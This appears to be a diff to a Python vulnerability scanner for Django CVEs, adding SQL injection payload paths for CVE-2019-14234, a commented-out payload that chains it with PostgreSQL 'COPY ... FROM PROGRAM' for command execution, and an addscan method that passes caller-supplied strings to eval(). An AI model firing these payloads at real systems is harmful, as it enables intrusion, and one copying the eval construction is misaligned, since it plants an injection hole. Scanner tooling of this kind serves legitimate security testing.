@@ -10,6 +10,7 @@
         2. Django JSONfield sql注入漏洞
             CVE-2019-14234
                 Payload: https://vulhub.org/#/environments/django/CVE-2018-14574/
+                         https://blog.csdn.net/weixin_42250835/article/details/121106792
 
         3. Django CommonMiddleware url重定向漏洞
             CVE-2018-14574
@@ -53,13 +54,25 @@ class Django():
 
         self.cve_2019_14234_payloads = [
             {
-                'path': 'collection/?detail__a%27b=123',
+                'path': 'admin/vuln/collection/?detail__a\'b=123',
                 'data': ''
             },
             {
-                'path': '?detail__a%27b=123',
+                'path': 'vuln/collection/?detail__a\'b=123',
                 'data': ''
-            }
+            },
+            {
+                'path': 'collection/?detail__a\'b=123',
+                'data': ''
+            },
+            {
+                'path': '?detail__a\'b=123',
+                'data': ''
+            },
+            # {   # * 配合CVE-2019-9193完成Getshell
+            #     'path': "?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'touch /tmp/test.txt'--%20",
+            #     'data': ''
+            # }
         ]
 
         self.cve_2018_14574_payloads = [
@@ -376,7 +389,10 @@ class Django():
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.cve_2017_12794_scan, url=url),
             thread(target=self.cve_2019_14234_scan, url=url),
